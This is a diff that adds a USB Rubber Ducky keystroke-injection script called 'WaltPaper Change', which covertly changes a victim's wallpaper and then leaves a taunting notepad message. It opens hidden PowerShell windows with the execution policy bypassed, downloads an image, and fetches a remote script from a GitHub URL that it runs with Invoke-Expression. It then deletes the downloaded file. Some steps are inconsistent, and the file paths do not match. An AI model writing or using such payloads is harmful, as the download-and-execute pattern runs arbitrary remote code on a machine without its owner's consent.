@@ -1,0 +1,25 @@
+REM TITLE WaltPaper Change
+REM AUTHOR LWHITN
+REM DESCRIPTION Program discretely changes wallpaper and deltes file before alerting user via notepad
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass Invoke-WebRequest -Uri https://i.imgur.com/53p0UMR.jpeg -OutFile C:\Windows\Temp\waltpaper.jpeg
+DELAY 1000
+GUI r
+DELAY 300
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/LandonW385/rubberducky/main/waltpaper.ps1; invoke-expression $pl
+GUI r
+DELAY 300
+STRING powershell -w h -NoP -NonI -Exec Bypass Start-Sleep -Seconds 2; Remove-Item $env:TEMP\waltpaper.jpeg
+DELAY 1000
+GUI r
+DELAY 500
+STRING notepad
+ENTER
+DELAY 1000
+GUI UPARROW
+STRING Hello, hope you enjoy the new wallpaper!
+ENTER
+STRING (￣_,￣ )
+ENTER
